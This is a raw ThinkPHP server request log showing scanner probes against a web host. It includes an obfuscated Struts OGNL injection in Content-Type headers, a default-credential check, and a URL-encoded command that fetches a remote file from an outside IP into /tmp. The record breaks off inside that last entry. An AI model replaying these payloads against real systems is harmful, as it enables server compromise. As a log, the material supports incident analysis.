[ 2017-04-06T00:58:16+08:00 ] 101.37.28.32 140.205.201.32 POST /ypghauxqcdbj
[ log ] 101.37.28.32:80/ypghauxqcdbj [运行时间：0.003536s][吞吐率：282.81req/s] [内存消耗：620.60kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ypghauxqcdbj',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'content-length' => '22',
  'host' => '101.37.28.32:80',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812.elasticsearch_unauthorized)',
)
[ info ] [ PARAM ] array (
  '{"aliyun":_"vulntest"}' => '',
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T00:58:16+08:00 ] 101.37.28.32 140.205.201.32 GET /ypghauxqcdbj
[ log ] 101.37.28.32:80/ypghauxqcdbj [运行时间：0.003334s][吞吐率：299.94req/s] [内存消耗：619.71kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ypghauxqcdbj',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => '101.37.28.32:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812.elasticsearch_unauthorized)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T00:58:16+08:00 ] 101.37.28.32 140.205.201.32 DELETE /ypghauxqcdbj
[ log ] 101.37.28.32:80/ypghauxqcdbj [运行时间：0.003212s][吞吐率：311.31req/s] [内存消耗：620.88kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ypghauxqcdbj',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => '101.37.28.32:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812.elasticsearch_unauthorized)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T00:58:17+08:00 ] 101.37.28.32 140.205.201.32 GET /warning
[ log ] 101.37.28.32:80/warning [运行时间：0.003443s][吞吐率：290.44req/s] [内存消耗：619.87kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'warning',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:03:06+08:00 ] 101.37.28.32 140.205.201.32 GET /pleasereadthis
[ log ] 101.37.28.32:80/pleasereadthis [运行时间：0.003501s][吞吐率：285.62req/s] [内存消耗：619.91kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'pleasereadthis',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:07:04+08:00 ] 101.37.28.32 140.205.201.32 GET /please_read/_search
[ log ] 101.37.28.32:80/please_read/_search [运行时间：0.003566s][吞吐率：280.42req/s] [内存消耗：619.98kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'please_read',
    1 => '_search',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:10:28+08:00 ] 101.37.28.32 140.205.201.32 GET /about/
[ log ] 101.37.28.32:80/about/ [运行时间：0.003820s][吞吐率：261.78req/s] [内存消耗：619.86kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'about',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:14:03+08:00 ] 101.37.28.32 140.205.201.32 GET /clusters.jsf
[ log ] 101.37.28.32:80/clusters.jsf [运行时间：0.006874s][吞吐率：145.47req/s] [内存消耗：619.89kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'clusters.jsf',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:21:36+08:00 ] 101.37.28.32 140.205.201.32 GET /
[ log ] 101.37.28.32:80/ [运行时间：0.002734s][吞吐率：365.74req/s] [内存消耗：650.58kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:23:52+08:00 ] 101.37.28.32 140.205.201.32 GET /hwi/
[ log ] 101.37.28.32:80/hwi/ [运行时间：0.003518s][吞吐率：284.24req/s] [内存消耗：619.86kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'hwi',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:24:39+08:00 ] 101.37.28.32 140.205.201.32 POST /
[ log ] 101.37.28.32/ [运行时间：0.002639s][吞吐率：378.92req/s] [内存消耗：650.65kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'content-length' => '431',
  'host' => '101.37.28.32',
  'content-type' => 'multipart/form-data; boundary=-333053153',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812.struts-s2-046)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:25:40+08:00 ] 101.37.28.32 140.205.201.32 GET /
[ log ] 101.37.28.32:80/ [运行时间：0.002604s][吞吐率：384.02req/s] [内存消耗：650.58kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:26:11+08:00 ] 101.37.28.32 140.205.201.32 GET /
[ log ] 101.37.28.32:80/ [运行时间：0.002624s][吞吐率：381.09req/s] [内存消耗：650.58kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:26:20+08:00 ] 101.37.28.32 140.205.201.32 GET /
[ log ] 101.37.28.32:80/ [运行时间：0.002608s][吞吐率：383.43req/s] [内存消耗：650.58kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:26:26+08:00 ] 101.37.28.32 140.205.201.32 GET /jobs/
[ log ] 101.37.28.32:80/jobs/ [运行时间：0.003463s][吞吐率：288.76req/s] [内存消耗：619.86kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'jobs',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:26:30+08:00 ] 101.37.28.32 140.205.201.32 GET /index.php
[ log ] 101.37.28.32:80/index.php [运行时间：0.002599s][吞吐率：384.76req/s] [内存消耗：650.59kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:26:36+08:00 ] 101.37.28.32 140.205.201.32 GET /rs-status
[ log ] 101.37.28.32:80/rs-status [运行时间：0.003425s][吞吐率：291.96req/s] [内存消耗：619.88kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'rs-status',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:26:45+08:00 ] 101.37.28.32 140.205.201.32 GET /master-status
[ log ] 101.37.28.32:80/master-status [运行时间：0.003525s][吞吐率：283.69req/s] [内存消耗：619.90kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'master-status',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:26:48+08:00 ] 101.37.28.32 140.205.201.32 GET /dfshealth.html
[ log ] 101.37.28.32:80/dfshealth.html [运行时间：0.003464s][吞吐率：288.68req/s] [内存消耗：619.90kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'dfshealth',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:26:53+08:00 ] 101.37.28.32 140.205.201.32 GET /
[ log ] 101.37.28.32/ [运行时间：0.002548s][吞吐率：392.47req/s] [内存消耗：650.90kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '101.37.28.32',
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'content-type' => '${(\\u0023a1=333053153\\u0029\\u002e(#a2=1234567890).(#a3=#a1+#a2).(#a4=\'ttpS\\u0065rvletR\\u0065sponse\').(#a6=\'com.op\\u0065nsympho\').(#a5=\'ny.x\\u0077ork2.disp\\u0061tcher.H\').(#a7=#a6+#a5+#a4).(#a8=\'un\').(#a9=\'_\\u0061liy\').(#a10=#a9+#a8).(#x1=#cont\\u0065xt[#a7].getWr\\u0069ter()).(#x1.pr\\u0069nt(#a3+#a10)).(#x1.cl\\u006fse())}%0d%0a%20multipart/form-data',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:26:56+08:00 ] 101.37.28.32 140.205.201.32 POST /
[ log ] 101.37.28.32/ [运行时间：0.002608s][吞吐率：383.43req/s] [内存消耗：652.13kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '101.37.28.32',
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'content-type' => '${(\\u0023a1=333053153\\u0029\\u002e(#a2=1234567890).(#a3=#a1+#a2).(#a4=\'ttpS\\u0065rvletR\\u0065sponse\').(#a6=\'com.op\\u0065nsympho\').(#a5=\'ny.x\\u0077ork2.disp\\u0061tcher.H\').(#a7=#a6+#a5+#a4).(#a8=\'un\').(#a9=\'_\\u0061liy\').(#a10=#a9+#a8).(#x1=#cont\\u0065xt[#a7].getWr\\u0069ter()).(#x1.pr\\u0069nt(#a3+#a10)).(#x1.cl\\u006fse())}%0d%0a%20multipart/form-data',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-length' => '1',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:27:02+08:00 ] 101.37.28.32 140.205.201.32 GET /dfshealth.jsp
[ log ] 101.37.28.32:80/dfshealth.jsp [运行时间：0.003449s][吞吐率：289.94req/s] [内存消耗：619.90kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'dfshealth.jsp',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:27:04+08:00 ] 101.37.28.32 140.205.201.32 GET /hadoop/dfshealth.jsp
[ log ] 101.37.28.32:80/hadoop/dfshealth.jsp [运行时间：0.003727s][吞吐率：268.32req/s] [内存消耗：619.98kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'hadoop',
    1 => 'dfshealth.jsp',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:28:10+08:00 ] 101.37.28.32 140.205.201.32 GET /solr/
[ log ] 101.37.28.32:80/solr/ [运行时间：0.004416s][吞吐率：226.45req/s] [内存消耗：619.86kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'solr',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:29:31+08:00 ] 101.37.28.32 140.205.201.32 GET /
[ log ] 101.37.28.32:80/ [运行时间：0.004136s][吞吐率：241.79req/s] [内存消耗：650.58kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T01:33:29+08:00 ] 101.37.28.32 140.205.201.32 GET /info
[ log ] 101.37.28.32:80/info [运行时间：0.003538s][吞吐率：282.64req/s] [内存消耗：619.86kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'info',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T02:02:46+08:00 ] 101.37.28.32 140.205.201.32 GET /j_acegi_security_check
[ log ] 101.37.28.32:80/j_acegi_security_check [运行时间：0.006723s][吞吐率：148.74req/s] [内存消耗：619.98kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'j_acegi_security_check',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T02:02:52+08:00 ] 101.37.28.32 140.205.201.32 GET /admin/
[ log ] 101.37.28.32:80/admin/ [运行时间：0.006518s][吞吐率：153.42req/s] [内存消耗：620.59kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => 'Basic MTox',
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T02:02:55+08:00 ] 101.37.28.32 140.205.201.32 GET /
[ log ] 101.37.28.32:80/ [运行时间：0.004471s][吞吐率：223.66req/s] [内存消耗：650.69kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => 'Basic MTox',
  'referer' => 'http://101.37.28.32/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812)',
  'host' => '101.37.28.32:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T02:41:55+08:00 ] 101.37.28.32 212.47.246.179 GET /cache/global/img/gs.gif
[ log ] www.baidu.com/cache/global/img/gs.gif [运行时间：0.003550s][吞吐率：281.69req/s] [内存消耗：619.54kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cache',
    1 => 'global',
    2 => 'img',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.baidu.com',
  'user-agent' => 'Mozilla',
  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T02:47:40+08:00 ] 101.37.28.32 139.162.124.167 GET /
[ log ] 101.37.28.32/ [运行时间：0.002689s][吞吐率：371.90req/s] [内存消耗：650.35kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '101.37.28.32',
  'user-agent' => 'Mozilla/5.0',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T02:53:57+08:00 ] 101.37.28.32 116.62.176.205 GET /
[ log ] 101.37.20.50:80/ [运行时间：0.002753s][吞吐率：363.24req/s] [内存消耗：650.27kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '101.37.20.50:80',
  'connection' => 'Close',
  'accept-encoding' => 'identity',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T03:56:15+08:00 ] 101.37.28.32 58.63.210.14 GET /index.action/shell?%77%67%65%74%20%2D%50%20%2F%74%6D%70%20%68%74%74%70%3A%2F%2F%36%31%2E%31%36%30%2E%32%31%31%2E%32%30%30%3A%31%32%34%35%39%2F%68%61%63%6B%71%7A
[ log ] 101.37.28.32/index.action/shell?%77%67%65%74%20%2D%50%20%2F%74%6D%70%20%68%74%74%70%3A%2F%2F%36%31%2E%31%36%30%2E%32%31%31%2E%32%30%30%3A%31%32%34%35%39%2F%68%61%63%6B%71%7A [运行时间：0.003671s][吞吐率：272.41req/s] [内存消耗：621.95kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index.action',
    1 => 'shell',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
